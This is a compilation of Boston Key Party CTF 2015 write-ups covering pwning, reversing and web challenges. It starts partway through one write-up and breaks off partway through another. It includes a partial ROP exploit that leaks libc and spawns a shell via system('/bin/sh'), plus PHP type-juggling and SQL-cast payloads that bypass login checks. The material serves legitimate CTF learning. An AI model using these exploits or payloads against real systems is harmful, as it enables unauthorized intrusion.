    if (owed == 0.0) {
        if (money > 9999999)
      action_hiscore();
    }
  ...
}
void action_hiscore() {
    char buf[268];
  ....
  read(0, buf, 0x400);
  ...
}
```
However, if understanding the game rule, we can know the condition is impossible to reach.  
So we must find another vulunerbility.  
In fact, there is a bof when `play_game()` starting.  
It cannot overflow to return address, but we can use it to change function pointers. :D  

The programe use `simple-gc`.  
(https://github.com/dhamidi/simple-gc/)  
It's create two garbage-collectors and put function pointer `exploit_free` and `string_free` to gc.  
Then, gc will trigger when we do `sleep` action.  
We can overwrite function ptr to `action_hiscore`, and we can overwrite the return address.  

Now, we can write the exploit.  
```
arg1 => rdi
arg2 => rsi
arg3 => rdx
...
```

So we must find some gadget to control arguments at first.  
Then, we can use `put()` to leak arbitrary address.  
There exist a little bug.... stdout dupped to socket.  
We won't receive the content immediately.  
To solve this bug, I return to `action_hiscore()` again because it has `fflush()` at the end of function.  

After leak the address, we can calulate the address of `system()`.  
Next, We need a string of "/bin/sh".  
Luckily, we can find it in libc, too.  
So we can call `system("/bin/sh")` to get the shell.  

My partitial exploit:  
```
# leak address
raw_input("wait gdb")
read_until("name? ")
pop_rdi = up64("402fc3")
got = up64("605061")
put = up64("400cd0")
payload = "a"*280 + pop_rdi + got + put + bof
send_line(payload)
read_until("...-'\"\n")
read_until("!\n")

# get leak and count libc
leak = read_line().strip()[::-1].encode("hex")
base = int(leak+"00", 16) - 0x54400
system = hex(base + 0x46640)[2:]
system = up64(system)
binsh = hex(base + 0x17d87b)[2:]

# get and shell out
read_until("name? ")
buf = up64("605800")
payload = "a"*280 + pop_rdi + up64(binsh) + system
send_line(payload)
read_until("!\n")

t.interact()
```

`flag: stay_in_school_and_dont_do_the_grugq`  

## Other write-ups and resources

* <http://ddaa.logdown.com/posts/256270-boston-key-party-ctf-2015-275-harvard-square> or <http://ddaa.tw/bktctf_pwn_275_harvard_square.html>
* [Chinese](http://blog.orange.tw/2015/03/boston-key-parcty-ctf-2015-harvard.html)
* [Chinese](http://www.secpulse.com/archives/5013.html)
* <https://rzhou.org/~ricky/bkpctf2015/harvard_square/>
# Boston Key Party CTF 2015: JFK/Umass

**Category:** Pwning
**Points:** 300
**Solves:** 17
**Description:**

> Do not use /boot/System.map. It's obsolete! ssh jfk@54.152.92.112 password: jfk : 300

## Write-up

(TODO)

## Other write-ups and resources

* [Writeup by tasteless](http://tasteless.eu/2015/03/boston-key-party-2015-jfkumass/)
* [Writeup by Neg9](https://neg9.org/news/2015/3/2/bpk2015-jfk-umass-pwning-300-writeup)
* <https://rzhou.org/~ricky/bkpctf2015/jfk/>
* <https://github.com/kitctf/writeups/tree/master/bkp2015/jfk>
# Boston Key Party CTF 2015: Kendall

**Category:** Pwning
**Points:** 300
**Solves:** 31
**Description:**

> 52.0.164.37:8888 : 300

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctfcrew.org/writeup/97>
* <http://r3dey3.com/2015-03/bkpctf-kendall/>
* <https://github.com/pwning/public-writeup/blob/master/bkp2015/pwn300-kendall/writeup.md>
* <https://gist.github.com/ancat/a2649d080dbfcdbe42b8>
* [How the challenge was designed](http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/)
* [Chinese](http://www.secpulse.com/archives/5013.html)# Boston Key Party CTF 2015: Mattapan

**Category:** Pwning
**Points:** 150
**Solves`:** 33
**Description:**

> (UPDATED!) We have come across an OpenFlow switch. Maybe you could pwn the traffic for us? nc 54.88.69.118 8888 or nc mattapan.bostonkey.party 8888 : 150

## Write-up

by [dogshep](https://github.com/dogshep)

Mattapan Writeup
By: Dogshep - #jmp-esp

Summary:

This challenge required a basic use of SDN (Software Defined Networking). Basically you told the server to set up a switch and connect to your controller at a set IP address at port 3366.

Walkthrough:

1. Netcat to 54.88.69.118 8888 or mattapan.bostonkey.party 8888 (Furst created a mirror since things were going rather slowly for the first one.
2. Enter in the answer to the Park Street Challenge (easy enough to Google the other challenge)
3. Enter the IP address for the BKP switch to connect to for it's controller (don't use 8.8.8.8. you don't own 8.8.8.8)
4. You'll notice that the challenge says it's booting up a switch and connecting, and that you'll have seconds to program the switch before it starts sending data then kills itself.
5. If you have your controller set up correctly it will accept the switch, set it up simply, and accept all traffic to the controller (see instructions on setting up controller below)
6. Once the controller is accepting traffic, you can sniff it with tcpdump/wireshark/etc
7. Grabbing the data and following the basic tcp stream, you can see the flag in the garbled mess

Setting up NOX (Openflow controller):

<http://archive.openflow.org/wp/deploy-labsetup/#OpenFlow_Controller_NOX_0_6>

1. Follow the above to set up a normal controller and get it running so you can launch it.
2. Run `./nox_core -i ptcp:6633 switch`
   * This will set up an openflow controller on 6633 and the switch syntax runs a basic switch module so the switch can actually send data when it connects
   
If you have any questions/concerns please contact me on freenode as dogshep, or dogshep {at} gmail { dot } com.

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/bkp2015/pwn150-mattapan/writeup.md>
# Boston Key Party CTF 2015: Quincy Adams

**Category:** Pwning
**Points:** 200
**Solves:** 9
**Description:**

> The MBTA wrote a cool system. It's pretty bad though, sometimes the commands work, sometimes they don't... Exploit it. (kspace flag) 54.165.91.92 8899 : 200

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-adams-kspace-write-up/> (down)
* <https://rzhou.org/~ricky/bkpctf2015/zenhv>
# Boston Key Party CTF 2015: Quincy Center

**Category:** Pwning
**Points:** 100
**Solves:** 24
**Description:**

> The MBTA wrote a cool system. It's pretty bad though, sometimes the commands work, sometimes they don't... Exploit it. (uspace flag) 54.165.91.92 8899 : 100

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-center-uspace-write-up/> (down)
* <https://gist.githubusercontent.com/anonymous/dca12da792dfb7441986/raw/f758bf632de573d0946d54f5831cd847ee5e61f9/exploit_uspace.py>
* <https://rzhou.org/~ricky/bkpctf2015/zenhv/>
# Boston Key Party CTF 2015 write-ups

* <http://bostonkey.party/>
* [Scoreboard](http://bostonkey.party/scoreboard) or [here](scoreboard.txt)
* [Number of solves per task](bostonstats.txt)

## Completed write-ups

* [crypto/wood-island](crypto/wood-island)
* [pwning/harvard-square](pwning/harvard-square)
* [pwning/mattapan](pwning/mattapan)
* [reversing/haymarket](reversing/haymarket)
* [reversing/wellington](reversing/wellington)
* [school-bus/brigham-circle](school-bus/brigham-circle)
* [school-bus/bu-central](school-bus/bu-central)
* [school-bus/heath-street](school-bus/heath-street)
* [school-bus/longwood-medical](school-bus/longwood-medical)
* [school-bus/museum-of-fine-arts](school-bus/museum-of-fine-arts)
* [school-bus/northeastern-univ](school-bus/northeastern-univ)
* [school-bus/park-street](school-bus/park-street)
* [school-bus/prudential](school-bus/prudential)
* [school-bus/riverside](school-bus/riverside)
* [school-bus/symphony](school-bus/symphony)

## External write-ups only

* [crypto/airport](crypto/airport)
* [crypto/bowdoin](crypto/bowdoin)
* [crypto/orient-heights](crypto/orient-heights)
* [crypto/wonderland](crypto/wonderland)
* [pwning/alewife](pwning/alewife)
* [pwning/andrew](pwning/andrew)
* [pwning/braintree](pwning/braintree)
* [pwning/broadway](pwning/broadway)
* [pwning/central-square](pwning/central-square)
* [pwning/jfk-umass](pwning/jfk-umass)
* [pwning/kendall](pwning/kendall)
* [pwning/quincy-adams](pwning/quincy-adams)
* [pwning/quincy-center](pwning/quincy-center)
* [reversing/community-college](reversing/community-college)
* [reversing/oak-grove](reversing/oak-grove)
* [reversing/sullivan-square](reversing/sullivan-square)

## Missing write-ups# Boston Key Party CTF 2015: Community College

**Category:** Reversing
**Points:** 300
**Solves:** 27
**Description:**

> I can't follow what's going on here. Can you? : 300

## Write-up

(TODO)

## Other write-ups and resources

* <http://rce4fun.blogspot.de/2015/03/boston-key-party-2015-community-college.html># Boston Key Party CTF 2015: Haymarket

**Category:** Reversing
**Points:** 150
**Solves:** 216
**Description:**

> Monty Hall wrote a script of how he was supposed to run one of his game shows for his trusty accounting computer some time ago, but hes not really sure what the punch cards mean any more. I mean, that was a while ago. Only, hes sure his key is hidden somewhere in these punch-cards, if he could figure out how to run them... : 150

## Write-up

by [MrVaughan](https://github.com/MrVaughan)

To solve this problem you first need to perform some reconaissance on identifying the type and strcuture of the punch cards. 

Some googling revealed this handy tool that was probably used to generate this challenge
http://www.kloth.net/services/cardpunch.php 

First, the above tool was used to generate a legend of characters and determine the ecoding method. ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789 was input into the tool to generate a bit of a legend. 

http://www.kloth.net/services/pcard.php?punch2=ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&code=DEC-029&unk=ignore&ccolor=yellow&t=png 

A manual decode of the first punch card did reveal some english text so it was concluded that the card was infact a DEC-029 model punch card.

You could certainly decode all 31 cards manually now but that would take you a long time. Looks like its time to write a decoder. 

Some Googling revealed a punch card decoder for another punch card challenge that was modified and calibrated to images provided. (will add url when I find it again) 


```python
from PIL import Image

def decode(code):
    if code == ['0']: return '0'
    elif code == ['1']: return '1'
    elif code == ['2']: return '2'
    elif code == ['3']: return '3'
    elif code == ['4']: return '4'
    elif code == ['5']: return '5'
    elif code == ['6']: return '6'
    elif code == ['7']: return '7'
    elif code == ['8']: return '8'
    elif code == ['9']: return '9'
    elif code == ['12', '1']: return 'A'
    elif code == ['12', '2']: return 'B'
    elif code == ['12', '3']: return 'C'
    elif code == ['12', '4']: return 'D'
    elif code == ['12', '5']: return 'E'
    elif code == ['12', '6']: return 'F'
    elif code == ['12', '7']: return 'G'
    elif code == ['12', '8']: return 'H'
    elif code == ['12', '9']: return 'I'
    elif code == ['11', '1']: return 'J'
    elif code == ['11', '2']: return 'K'
    elif code == ['11', '3']: return 'L'
    elif code == ['11', '4']: return 'M'
    elif code == ['11', '5']: return 'N'
    elif code == ['11', '6']: return 'O'
    elif code == ['11', '7']: return 'P'
    elif code == ['11', '8']: return 'Q'
    elif code == ['11', '9']: return 'R'
    elif code == ['0', '1']: return '/'
    elif code == ['0', '2']: return 'S'
    elif code == ['0', '3']: return 'T'
    elif code == ['0', '4']: return 'U'
    elif code == ['0', '5']: return 'V'
    elif code == ['0', '6']: return 'W'
    elif code == ['0', '7']: return 'X'
    elif code == ['0', '8']: return 'Y'
    elif code == ['0', '9']: return 'Z'
    elif code == ['11', '2', '8']: return '!'
    elif code == ['4', '8']: return '@'
    elif code == ['3', '8']: return '#'
    elif code == ['11', '3', '8']: return '$'
    elif code == ['0', '4', '8']: return '%'
    elif code == ['12', '7', '8']: return '^'
    elif code == ['12']: return '&amp;'
    elif code == ['11', '4', '8']: return '*'
    elif code == ['12', '5', '8']: return '('
    elif code == ['11', '5', '8']: return ')'
    elif code == ['11']: return '-'
    elif code == ['6', '8']: return '='
    elif code == ['0', '5', '8']: return '_'
    elif code == ['0', '3', '8']: return ','
    elif code == ['12', '6', '8']: return '+'
    elif code == ['12', '2', '8']: return '['
    elif code == ['0', '2', '8']: return '['
    elif code == ['11', '6', '8']: return ';'
    elif code == ['0', '6', '8']: return '&gt;'
    elif code == ['5', '8']: return "'"
    elif code == ['2', '8']: return ':'
    elif code == ['7', '8']: return '"'
    elif code == ['11', '7', '8']: return ' '
    elif code == ['12', '3', '8']: return '.'
    elif code == ['12', '4', '8']: return '&lt;'
    else: return '?'

rows = ['12', '11', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
r_h = 20
r_w = 7
r_begin = [16, 21]
nCols = 80
nRows = 12

folder = "/path/to/folder"
for num in range(31):
    path = folder  +"/L"+ str(num+1) + ".png"
    im = Image.open(path)
    pix = im.load()
    code = []
    text = ""
    for c in range (80):
        for r in range (12):
            pos_h = r_begin[1] + r * r_h #+ 3
            pos_w = r_begin[0] + c * r_w # + 3
            if pix[pos_w, pos_h] == (20, 20, 20, 255):
                code.append(rows[r])
        if len(code) > 0:
            text += decode(code)
            code = []
    print text
```

When you run this script on the folder of images you get the following ouput. (The script doesn't properly account 
for spaces and a couple of the special characters) You can now pull the flag out of the code without having to run the application (Thanks goodness).

```
IDENTIFICATIONDIVISION.PROGRAM-ID.LETS-MAKE-A-DEAL.AUTHORMONTEHALPARIN.
DATADIVISION.WORKING-STORAGESECTION.01DOORCHOICES.02GOODDOOR
PIC9.02FIRSTCHOICEPIC9.02OPENDOORPIC9.02CH
ANGEDOORPIC9.01CURRENTDATE.02CURRENTYEARPIC9(4).02
CURRENTMONTHPIC99.02CURRENTDAYPIC99.01DAYOFYEAR.02
CURRENTMONTHFILLERPIC9(4).02YEARDAYPIC9(3).01
CURRENTTIME.02CURRENTHOURPIC99.02CURRENTMINUTEPIC99.
02CURRENTTENSPIC9.02CURRENTONESPIC9.02FILLER
PIC99.PROCEDUREDIVISION.DISPLAY'MH:WELCOMETOLETSMAKEADEAL'.DI
SPLAY'MH:THEREARETHREEDOORS.ONLYONEWITHTHEKEY'.ACCEPTCURRENTTIMEF
ROMTIME.IFCURRENTONES&lt;4SETGOODDOORTO1ELSEIFCURRENTONES&lt;7
SETGOODDOORTO2ELSESETGOODDOORTO3END-IFEND-IFDISPLA
Y'MH:YOUMAYONLYOPENONEDOOR.WHICHDOOR?'.IFCURRENTTENS=0ORCURRE
NTTENS=3SETFIRSTCHOICETO1.IFCURRENTTENS=1ORCURRENTTENS=4S
ETFIRSTCHOICETO2.IFCURRENTTENS=2ORCURRENTTENS=5SETFIRSTCHOICE
TO3.DISPLAY'PLAYER:IPICKDOOR'FIRSTCHOICE'.'IFFIRSTCHOICE=GOODDO
ORDISPLAY'MH:THATISANINTERESTINGCHOICEOFDOOR.'IFCURRENTTENS=
OR0ORCURRENTTENS=4SETOPENDOORTO3END-IFIFCURRENTTENS=
1ORCURRENTTENS=5SETOPENDOORTO1END-IFIFCURRENTTENS=2O
1ORCURRENTTENS=3SETOPENDOORTO2END-IFDISPLAY'MH:LETM
EGIVEYOUAHINT.'DISPLAY'MONTYHALLOPENSDOOR'OPENDOORDISPLAY'A
GOATRUSHESOUTWITHNOKEY.'DISPLAY'MH:WOULDYOULIKETOCHANGEYOURD
GOORCHOICE?'DISPLAY'PLAYER:YES!MYLOGICMINORINCOLLEGEHASAUSE!'
GOORIFCURRENTTENS=2ORCURRENTTENS=4SETCHANGEDOORTO1E
ND-IFIFCURRENTTENS=0ORCURRENTTENS=5SETCHANGEDOORTO2EN
D-IFIFCURRENTTENS=1ORCURRENTTENS=3SETCHANGEDOORTO3END
-IFDISPLAY'PLAYER:IWILLCHOOSEDOOR'CHANGEDOOR'INSTEAD!'ELSE
SETCHANGEDOORTOFIRSTCHOICE.IFCHANGEDOOR=GOODDOORDISPLAY'MH:CONGRA
SETULATIONS!YOUFOUNDAKEY.'DISPLAY'MH:THEKEYIS:'DISPLAY'KEY(
SETALEXTREBEKISASOCIALENGINEER)'ELSEDISPLAY'MONTYHALLOPENSTHEDOOR.A
GOATJUMPSOUT.'DISPLAY'MH:THISISTHEINCORRECTDOOR.'DISPLAY'THE
```

FLAG: ALEXTREBEKISASOCIALENGINEER (found in second to last line of output)


## Other write-ups and resources

* <http://hackitguys.com/?p=16>
* <http://u.osu.edu/romig.1/2015/03/02/boston-key-party-haymarket-write-up/>
* <https://0x44696f21.wordpress.com/2015/03/02/haymarket-boston-key-party-2015/>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-haymarket.html)
* [Resulting Cobold Code](ideone_ylIgJz.cbl) - [Source](http://ideone.com/ylIgJz)
# Boston Key Party CTF 2015: Oak Grove

**Category:** Reversing
**Points:** 300
**Solves:** 9
**Description:**

> This crappy 3ds homebrew is protected by some anti-piracy scheme. Can you crack it? : 300

## Write-up

(TODO)

## Other write-ups and resources

* <http://binja.github.io/2015/03/02/bkpctf2015-oakgrove-writeup/># Boston Key Party CTF 2015: Sullivan Square

**Category:** Reversing
**Points:** 350
**Solves:** 21
**Description:**

> We discovered this program in my old algorithms homeworks, can you help me remember the key? : 350

## Write-up

(TODO)

## Other write-ups and resources

* <https://kitctf.de/writeups/bkp2015/sullivan-square/>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-sullivan-square.html)
* [Writeup by Neg9](https://neg9.org/news/2015/3/4/boston-key-party-2015-sullivan-square-reversing-350-writeup)
# Boston Key Party CTF 2015: Wellington

**Category:** Reversing
**Points:** 250
**Solves:** 57
**Description:**

> If you had the code, you'd see that the program is calling `decrypt("[QeZag^VQZShWQgeWVQSe]ZW^^Q[`efWSV", X). Unfortunately, you don't have it, HAHAHAHAHAHA. Ho, and by the way, the flag ends with a dot. : 250

## Write-up

by [polym](https://github.com/abpolym)

This writeup is similar and somewhat based on [this remote writeup](https://github.com/noobdoesre/write-ups/tree/master/boston-key-party-2015/wellington).

After finding out that we are given an ELF file, We first use `strings` and `grep` to find suspicious strings:

```bash
$ strings -a troll_log.4643d195d55746aa180abf7144909677 | igrep flag
flag_value
prolog_flag
$use_flag
/home/diaz/GP/src/src/BipsPl/flag.pl
current_prolog_flag
set_prolog_flag
flag_c.c
```

We see that there are Prolog files, probably from a Gnu Prolog variant [implementation](http://code.metager.de/source/xref/gnu/gprolog/1.4.2/src/BipsPl/).
This is also consistent with the hint that the flag ends with a dot `.`, since prolog statements end with a dot.

So we run the program:

```bash
$ chmod u+x troll_log.4643d195d55746aa180abf7144909677
$ ./troll_log.4643d195d55746aa180abf7144909677
BKP 2015 - Troll_log
Password:
```

We have to insert a password. After some testing, we see that some input (e.g. `X.`), does result in a `WiN` text and others do result in `LOSE`.

However, if you type in a multiline input, the program breaks and you are greeted with a prolog interpreter message:

```bash
$ ./troll_log.4643d195d55746aa180abf7144909677
BKP 2015 - Troll_log
Password: No
Pe
.

system_error(cannot_catch_throw(error(syntax_error('user_input:2 (char:1) expression expected'),read/1)))
warning: /home/jvoisin/prez/BKP2015/main.pl:19: user directive failed
GNU Prolog 1.3.0
By Daniel Diaz
Copyright (C) 1999-2007 Daniel Diaz
| ?- 
```

Pressing <kbd>Tab</kbd> twice, we see several procedures and terms, e.g. `flag`, `decrypt`, `LOSE` etc.

Though several procedures won't run with or without arguments, we can run the decrypt function:

```bash
[...]
| ?- decrypt("[QeZag^VQZShWQgeWVQSe]ZW^^Q[`efWSV", X).

X = [105,95,115,104,111,117,108,100,95,104,97,118,101,95,117,115,101,100,95,97,115,107,104,101,108,108,95,105,110,115,116,101,97,100]
```

This looks like decimal ASCII values, so let's print them as characters:

```bash
$ python
[...]
>>> X = [105,95,115,104,111,117,108,100,95,104,97,118,101,95,117,115,101,100,95,97,115,107,104,101,108,108,95,105,110,115,116,101,97,100]     
>>> print ''.join([chr(x) for x in X])
i_should_have_used_askhell_instead
>>> 
```

The flag is `i_should_have_used_askhell_instead`.

## Other write-ups and resources

* <https://github.com/noobdoesre/write-ups/tree/master/boston-key-party-2015/wellington>
* <http://wiremask.eu/boston-key-party-2015-wellington/>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-wellington.html)
# Boston Key Party CTF 2015: Brigham Circle

**Category:** School-Bus
**Points:** 25
**Solves:** 485
**Description:**

> Sanitization is hard, lets use regexp! : 25

## Write-up

by [tomvangoethem](https://github.com/tomvangoethem)

When given an array as "input string", the [`ereg()`](http://php.net/manual/en/function.ereg.php) function will return `NULL`, which is not strictly equal to `FALSE`. This allows you to pass the [first check](https://github.com/ctfs/write-ups-2015/blob/master/boston-key-party-2015/school-bus/brigham-circle/52.10.107.64/index.txt#L12).

Similarly, for the [`strpos()`](http://php.net/manual/en/function.strpos.php) function, the value `NULL` is returned, which is strictly inequal to `FALSE`. 
As a result, the [second check](https://github.com/ctfs/write-ups-2015/blob/master/boston-key-party-2015/school-bus/brigham-circle/52.10.107.64/index.txt#L14) yields true when `$_GET['password']` is an array, i.e. when visiting `index.php?password[]=`.
This prints the flag: `OK_Maybe_using_rexpexp_wasnt_a_clever_move`.

## Other write-ups and resources

* <https://github.com/bl4de/ctf/blob/master/BostonKeyPartyCTF_2015/BrighamCircle.md>
* <https://ctf-team.vulnhub.com/boston-key-party-2015-bringham-circle/>
* <https://b01lers.net/challenges/Boston%20Key%20Party%202015/Brigham%20Circle/38/>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-brigham-circle.html)
# Boston Key Party CTF 2015: BU Central

**Category:** School-Bus
**Points:** 10
**Solves:** 765
**Description:**

> the flag is 'party' : 10

## Write-up

by [tomvangoethem](https://github.com/tomvangoethem)

Just submit `party` as a flag.

## Other write-ups and resources

* none yet# Boston Key Party CTF 2015: Heath Street

**Category:** School-Bus
**Points:** 100
**Solves:** 167
**Description:**

> During my time at KGB I learned how to hide all the stuff from alpha-dog. But damn it, I somehow lost some of the most important files... : 100

## Write-up

by [polym](https://github.com/abpolym)

Using `file`, wee see that we are given an ext4 image:

```bash
$ file secretArchive.6303dd5dbddb15ca9c4307d0291f77f4
ecretArchive.6303dd5dbddb15ca9c4307d0291f77f4: Linux rev 1.0 ext4 filesystem data (extents) (huge files) 
```

Mounting it with `mount` reveals a bunch of files containing a [transcript of Leonid Brezhnev's Telephone Conversation with Alexander Dubček](http://www2.gwu.edu/~nsarchiv/nsa/publications/DOC_readers/psread/doc81.htm):

```bash
$ sudo mount -o loop,rw secretArchive.6303dd5dbddb15ca9c4307d0291f77f4 /mnt
$ ls -a
. .. lost+found secret0 secret1 secret10 secret100 [...] secret998 secret999
$ file * | sort -k2
secret2:     ASCII text
secret8:     ASCII text
[...]
secret1980: UTF-8 Unicode text, with no line terminators
secret1337: Zip archive data, at least v1.0 to extract
$ mv secret1337 /tmp && cat * > /tmp/all
```

After trying to bruteforce the password of the `secret1337` password-protected ZIP file, we think that it is a [red herring](http://en.wikipedia.org/wiki/Red_herring).

The next step is to find deleted data using `extundelete`:

```bash
$ extundelete --restore-all secretArchive.6303dd5dbddb15ca9c4307d0291f77f4
WARNING: Extended attributes are not restored.
Loading filesystem metadata ... 2 groups loaded.
Loading journal descriptors ... 904 descriptors loaded.
Writing output to directory RECOVERED_FILES/
Searching for recoverable inodes in directory / ... 
368 recoverable inodes found.
Looking through the directory structure for deleted files ... 
Restored inode 2086 to file RECOVERED_FILES/secret5088
[...]
Restored inode 2362 to file RECOVERED_FILES/secret5364
Restored inode 2365 to file RECOVERED_FILES/.secret31337
Restored inode 2009 to file RECOVERED_FILES/secret5011
[...]
Restored inode 2296 to file RECOVERED_FILES/secret5298
0 recoverable inodes still lost.
```

We see a `.secret31337` file, which is a kgb archive:

```bash
$ file .secret31337
.secret31337: KGB Archiver file with compression level 3
$ kgb .secret31337
Extracting archive KGB_arch -3 .secret31337 ...
         0KB .secret: extracted
0KB -> 0KB w 0.00s. (142.86% czas: 12 KB/s)
$ cat .secret
flag{Komitet_gosudarstvennoy_bezopasnosti}
```

The flag is `flag{Komitet_gosudarstvennoy_bezopasnosti}`.

Another solution is to `grep` for specific strings:

```bash
$ strings -a secretArchive.6303dd5dbddb15ca9c4307d0291f77f4 | grep -i kgb
0kgb1
w<kGba
kkGbk
kgBh
     New York KGB messages of 1942 and 1943
[...]
The KGB communications between Mexico City and Moscow during 1943 to 
KGB_arch -3
aliases GNOME (GNOM in the Russian spelling) was in reality Ramon Mercader, a Spanish Communist recruited into KGB service
[...]
years, represented NSA. During the last phase of VENONA (1978 to 1980), NSA issued thirty-nine first-time translations of KGB 
KGB cipher by Cecil Phillips, Genevieve Feinstein, Lucille Campbell.
```

Then, search (First <kbd>Tab</kbd> to switch to the ASCII column, then press <kbd>/</kbd> to search for ASCII strings) in `hexedit` for the unusual string "KGB_arch":

![](kgb.png)
![](kgb_2.png)

Extract the file beginning at offset 10324992 (0x009D8C00) and ending at offset 10325051 (0x009D8C3B) - therefore of length 10325051-10324992 = 59 using `dd`:

```bash
$ dd bs=1 skip=10324992 count=59 if=secretArchive.6303dd5dbddb15ca9c4307d0291f77f4 of=output
59+0 records in
59+0 records out
59 bytes transferred in 0.000127 secs (464285 bytes/sec)
$ file output
output: KGB Archiver file with compression level 3
```

Then extract it using `kgb` and retrieve the flag.

## Other write-ups and resources

* <http://wiremask.eu/boston-key-party-2015-heath-street/>
* <http://blog.st3phn.com/2015/02/boston-key-party-ctf-2015-heath-street.html>
* <http://u.osu.edu/romig.1/2015/03/02/boston-key-party-heath-street-write-up/>
# Boston Key Party CTF 2015: Longwood Medical

**Category:** School-Bus
**Points:** 25
**Solves:** 430
**Description:**

> Because we dont trust mysqli_real_escape_string, we wrote our own military-grade sanitization method. : 25

## Write-up

by [tomvangoethem](https://github.com/tomvangoethem)

The anti-SQL-Injection check is implemented by checking whether the values of `$_GET['name']` and `$_GET['password']` are alpha-numerical.
Usually, this would be sufficient, but in this case [the SQL query](https://github.com/ctfs/write-ups-2015/blob/ddbc91270893ac39adbd5640a3f82e005875d2d0/boston-key-party-2015/school-bus/longwood-medical/52.10.107.64:8005/index.txt#L17) does not surround quotes around the user-supplied values. This means that when a numerical value is entered, a textual value is compared to the numerical one, causing an implicit cast.
A cast from string to integer will result in `0` when the string does not start with numerical values (which seemed to be the case both for `$name` and `$password` in this challenge).

Consequently, making a request to `index.php?name=0&password=0` printed out the flag: `Did_you_know_that_in_french_a_chiken_makes_the_sound_quotquotquotquot?`

## Other write-ups and resources

* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-longwood-medical.html)# Boston Key Party CTF 2015: Museum Of Fine Arts

**Category:** School-Bus
**Points:** 25
**Solves:** 377
**Description:**

> Because cryptography is hard, we only implemented a hand-made PRNG. What could possibly go wrong? : 25

## Write-up

by [Skybound1](https://github.com/Skybound1)

From the [source code](./52.10.107.64\:8004/index.txt) we can see that we need to guess a random number, this is stored in the session to be compared.

The actual comparison between `$_GET['password']` and `$_SESSION['password']` takes place before the assignment of the next random number and with a `==` instead of `===`. 

Therefore, by deleting the session cookie and sending the request `http://52.10.107.64:8004/?password=` we can get the flag as `$_SESSION['password']` would not contain anything.

## Other write-ups and resources

* <https://github.com/bl4de/ctf/blob/master/BostonKeyPartyCTF_2015/MuseumOfFineArts.md>
* <https://ctf-team.vulnhub.com/boston-key-party-2015-museum/>
* [Japanese](http://kazu1130-h.hatenablog.jp/entry/2015/03/02/034426)
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-museum-of-fine.html)
# Boston Key Party CTF 2015: Northeastern Univ

**Category:** School-Bus
**Points:** 25
**Solves:** 511
**Description:**

> Of course, a timing attack might be the answer, but Im quite sure that you can do better than that. : 25

## Write-up

by [oyearunpal](https://github.com/oyearunpal) and [polym](https://github.com/abpolym)

If we look at the given [php file](./52.10.107.64\:8003/index.txt) we see that the author compares the `password` with the contents of `$flag` using `strcmp`:

```php
if (strcmp($_GET['password'], $flag) == 0)
```

However, if you compare the result of `strcmp` using `==` instead of `===`, it [might fail](https://coderwall.com/p/lflzkq/php-strcmp-could-leave-you-alone-in-deep-sh-t).

So if we specify the `password` parameter as an array, e.g. `http://52.10.107.64:8003/?password[]=`, we will get the flag:

> Flag: `Still_better_than_the_d0uble_equals`

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/03/boston-key-party-2015-school-bus-flag-3.html>
* <https://ctf-team.vulnhub.com/boston-key-party-2015-northeastern-university/>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-northeastern-univ.html)
# Boston Key Party CTF 2015: Park Street

**Category:** School-Bus
**Points:** 10
**Solves:** 356
**Description:**

> What is the OpenFlow table modification message type to add a new flow? : 10

## Write-up

by [polym](https://github.com/abpolym)

Reading the [official specification](https://www.opennetworking.org/images/stories/downloads/sdn-resources/onf-specifications/openflow/openflow-spec-v1.0.0.pdf) and searching for `modification`, we see in section `4.6 Flow Table Modification Messages` the `OFPFC_ADD` type for adding a New flow.

## Other write-ups and resources

* <https://github.com/bl4de/ctf/blob/master/BostonKeyPartyCTF_2015/parkstreet.txt>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-park-street.html)# Boston Key Party CTF 2015: Prudential

**Category:** School-Bus
**Points:** 25
**Solves:** 426
**Description:**

> I dont think that sha1 is broken. Prove me wrong. : 25

## Write-up

by [oyearunpal](https://github.com/oyearunpal) and [polym](https://github.com/abpolym)

We are given the [php source code](./52.10.107.64\:8001/index.txt) and see that the author compares the sha1 hashes of the `name` and `password` query parameters:

```php
[...]
else if (sha1($_GET['name']) === sha1($_GET['password']))
[...]
```

We can force the results for both inputs to be null, e.g. with `http://52.10.107.64:8001/?name[]=s&password[]=ss` so that it results in the following check:

```php
[...]
else if (sha1(NULL) === sha1(NULL))
[...]
```

The flag is `I_think_that_I_just_broke_sha1`.

## Other write-ups and resources

* <https://github.com/bl4de/ctf/blob/master/BostonKeyPartyCTF_2015/Prudential.md>
* <https://ctf-team.vulnhub.com/boston-key-party-2015-prudential/>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-prudential.html)
# Boston Key Party CTF 2015: Riverside

**Category:** School-Bus
**Points:** 200
**Solves:** 94
**Description:**

> omg tha NSA hacked my super secret login, I caught them exfillin this pcap, am I t3h fuxxed? : 200

## Write-up

by [aSmig](https://github.com/aSmig)

We start with a pcap-ng capture file containing USB traffic.  Let's take a look.

```
$ ln -s challenge.pcapng.28c58da9dd07532d45aa68f9b825941e challenge.pcapng
$ tshark -r challenge.pcapng usb.bDescriptorType and usb.urb_type==67
  4 0.075077000         12.0 -> host         USB  GET DESCRIPTOR Response DEVICE
 24 0.150578000          1.0 -> host         USB  GET DESCRIPTOR Response DEVICE
 60 0.047392000          2.0 -> host         USB  GET DESCRIPTOR Response DEVICE
 75 0.074061000          1.0 -> host         USB  GET DESCRIPTOR Response DEVICE
 94 0.150211000          3.0 -> host         USB  GET DESCRIPTOR Response DEVICE
 96 0.150419000          2.0 -> host         USB  GET DESCRIPTOR Response DEVICE
